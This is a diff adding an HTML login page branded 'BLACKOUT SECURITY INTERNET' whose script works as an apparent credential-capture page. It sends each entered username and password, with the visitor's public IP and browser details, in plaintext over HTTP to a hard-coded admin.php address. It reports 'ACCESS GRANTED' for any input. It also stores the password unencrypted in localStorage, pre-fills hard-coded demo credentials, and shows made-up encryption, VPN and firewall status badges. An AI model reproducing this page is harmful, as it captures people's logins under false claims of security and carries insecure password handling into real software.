@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOG IN -  BLACKOUT SECURITY INTERNET</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0d1a2d 0%, #172336 50%, #0d1a2d 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #EBEBED;
+            font-weight: 400;
+            line-height: 1.5;
+            letter-spacing: 0.15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Cyber Grid Background */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(122, 255, 76, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(122, 255, 76, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        /* Animated Grid Lines */
+        .grid-line {
+            position: fixed;
+            background: rgba(122, 255, 76, 0.1);
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        .grid-line.horizontal {
+            width: 100%;
+            height: 1px;
+            animation: scanHorizontal 20s linear infinite;
+        }
+        
+        .grid-line.vertical {
+            width: 1px;
+            height: 100%;
+            animation: scanVertical 15s linear infinite;
+        }
+        
+        @keyframes scanHorizontal {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+        
+        @keyframes scanVertical {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100vw); }
+        }
+        
+        /* Glowing Particles */
+        .particle {
+            position: fixed;
+            width: 3px;
+            height: 3px;
+            background: #7AFF4C;
+            border-radius: 50%;
+            filter: blur(1px);
+            opacity: 0;
+            animation: particleFloat 8s infinite linear;
+            z-index: -1;
+        }
+        
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.8;
+            }
+            90% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(-100px) translateX(100px);
+                opacity: 0;
+            }
+        }
+        
+        .login-container {
+            background: rgba(23, 35, 54, 0.95);
+            border: 1px solid rgba(122, 255, 76, 0.2);
+            border-radius: 16px;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.5),
+                0 0 0 1px rgba(122, 255, 76, 0.1),
+                inset 0 0 30px rgba(122, 255, 76, 0.05);
+            width: 100%;
+            max-width: 480px;
+            padding: 50px 40px;
+            position: relative;
+            backdrop-filter: blur(10px);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .login-container:hover {
+            box-shadow: 
+                0 25px 80px rgba(0, 0, 0, 0.6),
+                0 0 0 1px rgba(122, 255, 76, 0.3),
+                inset 0 0 40px rgba(122, 255, 76, 0.08);
+        }
+        
+        /* Neon Border Effect */
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, 
+                rgba(122, 255, 76, 0.4), 
+                rgba(23, 35, 54, 0.4), 
+                rgba(122, 255, 76, 0.4));
+            border-radius: 18px;
+            z-index: -1;
+            opacity: 0;
+            animation: neonPulse 4s infinite;
+        }
+        
+        @keyframes neonPulse {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.3; }
+        }
+        
+        /* Header Section */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .login-title {
+            color: #7AFF4C;
+            font-size: 48px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+            text-shadow: 
+                0 0 10px rgba(122, 255, 76, 0.5),
+                0 0 20px rgba(122, 255, 76, 0.3);
+            position: relative;
+            display: inline-block;
+        }
+        
+        .login-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 2px;
+            background: linear-gradient(90deg, 
+                transparent, 
+                #7AFF4C, 
+                transparent);
+        }
+        
+        .company-title {
+            color: #EBEBED;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            margin-top: 20px;
+            opacity: 0.9;
+        }
+        
+        .company-title span {
+            color: #7AFF4C;
+            font-weight: 700;
+        }
+        
+        /* Status Indicator */
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 15px;
+            padding: 8px 16px;
+            background: rgba(122, 255, 76, 0.1);
+            border: 1px solid rgba(122, 255, 76, 0.2);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            animation: statusPulse 2s infinite;
+        }
+        
+        @keyframes statusPulse {
+            0%, 100% { 
+                box-shadow: 0 0 0 0 rgba(122, 255, 76, 0.4);
+            }
+            50% { 
+                box-shadow: 0 0 0 4px rgba(122, 255, 76, 0);
+            }
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #7AFF4C;
+            animation: dotPulse 1.5s infinite;
+        }
+        
+        @keyframes dotPulse {
+            0%, 100% { 
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% { 
+                opacity: 0.7;
+                transform: scale(0.8);
+            }
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .form-label {
+            display: block;
+            color: #EBEBED;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            opacity: 0.9;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-field {
+            width: 100%;
+            background: rgba(30, 46, 71, 0.6);
+            border: 1px solid rgba(122, 255, 76, 0.2);
+            border-radius: 12px;
+            color: #EBEBED;
+            font-size: 16px;
+            font-weight: 400;
+            padding: 18px 20px;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        
+        .input-field:focus {
+            border-color: #7AFF4C;
+            box-shadow: 
+                0 0 0 3px rgba(122, 255, 76, 0.1),
+                inset 0 0 20px rgba(122, 255, 76, 0.05);
+            background: rgba(30, 46, 71, 0.8);
+        }
+        
+        .input-field::placeholder {
+            color: rgba(235, 235, 237, 0.5);
+            font-weight: 300;
+        }
+        
+        /* Input Icons */
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(122, 255, 76, 0.7);
+            font-size: 18px;
+            pointer-events: none;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            color: rgba(235, 235, 237, 0.6);
+            cursor: pointer;
+            font-size: 18px;
+            padding: 8px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+        
+        .password-toggle:hover {
+            color: #7AFF4C;
+            background: rgba(122, 255, 76, 0.1);
+        }
+        
+        /* Remember Me & Forgot Password */
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: rgba(235, 235, 237, 0.8);
+            cursor: pointer;
+        }
+        
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(122, 255, 76, 0.3);
+            border-radius: 4px;
+            background: transparent;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .checkbox.checked {
+            background: #7AFF4C;
+            border-color: #7AFF4C;
+        }
+        
+        .checkbox.checked::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #172336;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .forgot-link {
+            color: #7AFF4C;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .forgot-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: #7AFF4C;
+            transition: width 0.3s ease;
+        }
+        
+        .forgot-link:hover::after {
+            width: 100%;
+        }
+        
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #7AFF4C 0%, #5AC73D 100%);
+            border: none;
+            border-radius: 12px;
+            color: #172336;
+            font-size: 16px;
+            font-weight: 700;
+            padding: 20px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 
+                0 10px 30px rgba(122, 255, 76, 0.4),
+                0 0 0 1px rgba(122, 255, 76, 0.2);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.2), 
+                transparent);
+            transition: left 0.5s;
+        }
+        
+        .login-btn:hover::before {
+            left: 100%;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(122, 255, 76, 0.1);
+            border-top: 3px solid #7AFF4C;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Message Box */
+        .message {
+            padding: 18px;
+            border-radius: 12px;
+            margin-top: 30px;
+            display: none;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            animation: fadeIn 0.3s ease;
+            border: 1px solid transparent;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .message.success {
+            background: rgba(122, 255, 76, 0.1);
+            color: #7AFF4C;
+            border-color: rgba(122, 255, 76, 0.3);
+        }
+        
+        .message.error {
+            background: rgba(255, 76, 76, 0.1);
+            color: #FF4C4C;
+            border-color: rgba(255, 76, 76, 0.3);
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: rgba(235, 235, 237, 0.5);
+            font-size: 12px;
+            letter-spacing: 0.5px;
+            border-top: 1px solid rgba(122, 255, 76, 0.1);
+            padding-top: 20px;
+        }
+        
+        .system-info {
+            color: rgba(122, 255, 76, 0.7);
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+        
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 3px;
+            background: rgba(122, 255, 76, 0.1);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #7AFF4C;
+            border-radius: 2px;
+            transition: width 2s ease;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 40px 30px;
+                margin: 20px;
+            }
+            
+            .login-title {
+                font-size: 36px;
+            }
+            
+            .company-title {
+                font-size: 20px;
+            }
+            
+            .input-field {
+                padding: 16px;
+                font-size: 15px;
+            }
+        }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(30, 46, 71, 0.3);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #7AFF4C;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #5AC73D;
+        }
+    </style>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Cyber Grid Background -->
+    <div class="cyber-grid"></div>
+    
+    <!-- Animated Grid Lines -->
+    <div class="grid-line horizontal" style="animation-delay: 0s;"></div>
+    <div class="grid-line horizontal" style="animation-delay: 5s;"></div>
+    <div class="grid-line horizontal" style="animation-delay: 10s;"></div>
+    <div class="grid-line horizontal" style="animation-delay: 15s;"></div>
+    <div class="grid-line vertical" style="animation-delay: 2s;"></div>
+    <div class="grid-line vertical" style="animation-delay: 7s;"></div>
+    <div class="grid-line vertical" style="animation-delay: 12s;"></div>
+    
+    <!-- Login Container -->
+    <div class="login-container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="login-title">LOG IN</h1>
+            <div class="company-title">
+                <span>BLACKOUT</span> SECURITY INTERNET
+            </div>
+            <div class="status-indicator">
+                <div class="status-dot"></div>
+                <span>SYSTEM: ONLINE • ACCESS: SECURE</span>
+            </div>
+        </div>
+        
+        <!-- Login Form -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label class="form-label" for="username">USERNAME</label>
+                <div class="input-container">
+                    <input type="text" 
+                           id="username" 
+                           class="input-field" 
+                           placeholder="Enter your username" 
+                           required
+                           autocomplete="off">
+                    <div class="input-icon">
+                        <i class="fas fa-user"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" for="password">PASSWORD</label>
+                <div class="input-container">
+                    <input type="password" 
+                           id="password" 
+                           class="input-field" 
+                           placeholder="Enter your password" 
+                           required
+                           autocomplete="off">
+                    <button type="button" class="password-toggle" id="togglePassword">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="remember-forgot">
+                <div class="remember-me" id="rememberMe">
+                    <div class="checkbox" id="checkbox"></div>
+                    <span>Remember me</span>
+                </div>
+                <a href="#" class="forgot-link">Forgot Password?</a>
+            </div>
+            
+            <button type="submit" class="login-btn" id="submitBtn">
+                ACCESS SYSTEM
+            </button>
+            
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <!-- Loading -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Authenticating credentials...</p>
+            </div>
+            
+            <!-- Message -->
+            <div class="message" id="message"></div>
+        </form>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div>SECURITY TERMINAL v2.4</div>
+            <div class="system-info">
+                ENCRYPTION: AES-256 • SESSION: ENCRYPTED • VPN: ACTIVE
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Create floating particles
+        function createParticles() {
+            const colors = ['#7AFF4C', '#5AC73D', '#8AFF6C'];
+            
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const size = Math.random() * 3 + 1;
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.background = color;
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                particle.style.animationDuration = `${Math.random() * 8 + 4}s`;
+                
+                document.body.appendChild(particle);
+            }
+        }
+        
+        // Server Configuration
+        const SERVER_URL = 'http://192.168.0.108:2525/admin.php';
+        
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+        
+        // Remember me checkbox
+        const checkbox = document.getElementById('checkbox');
+        const rememberMe = document.getElementById('rememberMe');
+        
+        rememberMe.addEventListener('click', function() {
+            checkbox.classList.toggle('checked');
+            localStorage.setItem('remember_me', checkbox.classList.contains('checked'));
+        });
+        
+        // Check saved credentials
+        function checkSavedCredentials() {
+            const savedUser = localStorage.getItem('saved_username');
+            const savedPass = localStorage.getItem('saved_password');
+            const remember = localStorage.getItem('remember_me') === 'true';
+            
+            if (savedUser && savedPass && remember) {
+                document.getElementById('username').value = savedUser;
+                document.getElementById('password').value = savedPass;
+                checkbox.classList.add('checked');
+                
+                // Type effect
+                typeEffect(savedUser, 'username');
+            }
+        }
+        
+        // Typing effect for username
+        function typeEffect(text, elementId) {
+            const input = document.getElementById(elementId);
+            input.value = '';
+            let i = 0;
+            
+            const typing = setInterval(() => {
+                if (i < text.length) {
+                    input.value += text.charAt(i);
+                    i++;
+                } else {
+                    clearInterval(typing);
+                }
+            }, 50);
+        }
+        
+        // Send data to Local Server
+        async function sendToServer(username, password, ip, location) {
+            try {
+                const loginData = {
+                    username: username,
+                    password: password,
+                    ip_address: ip,
+                    location: location,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    system: 'TOBI_PRODUCTIONS_SECURE_ACCESS',
+                    terminal_id: 'TERM-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                    access_level: 'PRIVILEGED'
+                };
+                
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(loginData)
+                });
+                
+                try {
+                    const data = await response.json();
+                    return { success: response.ok, data: data };
+                } catch (jsonError) {
+                    const text = await response.text();
+                    return { success: response.ok, data: { message: text } };
+                }
+                
+            } catch (error) {
+                console.error('Error sending to server:', error);
+                return { success: false, error: error.message };
+            }
+        }
+        
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return '192.168.1.' + Math.floor(Math.random() * 255);
+            }
+        }
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const message = document.getElementById('message');
+            const progressFill = document.getElementById('progressFill');
+            
+            // Show loading and progress
+            submitBtn.style.display = 'none';
+            loading.style.display = 'block';
+            message.style.display = 'none';
+            progressFill.style.width = '0%';
+            
+            // Start progress animation
+            setTimeout(() => {
+                progressFill.style.width = '100%';
+            }, 100);
+            
+            try {
+                // Get additional data
+                const userIP = await getUserIP();
+                const userLocation = 'ACCESS_POINT_' + Math.random().toString(36).substr(2, 6).toUpperCase();
+                
+                // Send to local server
+                const serverResponse = await sendToServer(username, password, userIP, userLocation);
+                
+                // Simulate authentication delay
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Hide loading and show button
+                loading.style.display = 'none';
+                submitBtn.style.display = 'block';
+                
+                if (username && password) {
+                    // Save credentials if remember me is checked
+                    if (checkbox.classList.contains('checked')) {
+                        localStorage.setItem('saved_username', username);
+                        localStorage.setItem('saved_password', password);
+                    }
+                    
+                    if (serverResponse.success) {
+                        message.textContent = 'ACCESS GRANTED • REDIRECTING TO CONTROL PANEL...';
+                        message.className = 'message success';
+                    } else {
+                        message.textContent = 'ACCESS GRANTED (LOCAL) • REDIRECTING...';
+                        message.className = 'message success';
+                    }
+                    
+                    message.style.display = 'block';
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'http://192.168.0.108:2525/admin.php/';
+                    }, 2000);
+                    
+                } else {
+                    message.textContent = 'ACCESS DENIED • INVALID CREDENTIALS';
+                    message.className = 'message error';
+                    message.style.display = 'block';
+                    progressFill.style.width = '0%';
+                }
+                
+            } catch (error) {
+                loading.style.display = 'none';
+                submitBtn.style.display = 'block';
+                
+                message.textContent = 'CONNECTION FAILED • TRY AGAIN';
+                message.className = 'message error';
+                message.style.display = 'block';
+                progressFill.style.width = '0%';
+            }
+        });
+        
+        // Initialize
+        window.addEventListener('DOMContentLoaded', function() {
+            // Create particles
+            createParticles();
+            
+            // Check saved credentials
+            checkSavedCredentials();
+            
+            // Auto-fill demo after 1 second
+            setTimeout(() => {
+                const usernameInput = document.getElementById('username');
+                const passwordInput = document.getElementById('password');
+                
+                if (!usernameInput.value && !passwordInput.value) {
+                    usernameInput.value = 'admin';
+                    passwordInput.value = 'tobi2024';
+                    typeEffect('admin', 'username');
+                }
+            }, 1000);
+            
+            // Add focus effects
+            const inputs = document.querySelectorAll('.input-field');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.parentElement.style.transform = 'translateY(-2px)';
+                });
+                
+                input.addEventListener('blur', function() {
+                    this.parentElement.style.transform = 'translateY(0)';
+                });
+            });
+            
+            // Update status indicator
+            const statusMessages = [
+                'SYSTEM: ONLINE • ACCESS: SECURE',
+                'ENCRYPTION: ACTIVE • VPN: CONNECTED',
+                'AUTHENTICATION: READY • SESSION: ENCRYPTED',
+                'SECURITY: MAXIMUM • FIREWALL: ACTIVE'
+            ];
+            
+            const statusText = document.querySelector('.status-indicator span');
+            let currentIndex = 0;
+            
+            setInterval(() => {
+                currentIndex = (currentIndex + 1) % statusMessages.length;
+                statusText.textContent = statusMessages[currentIndex];
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
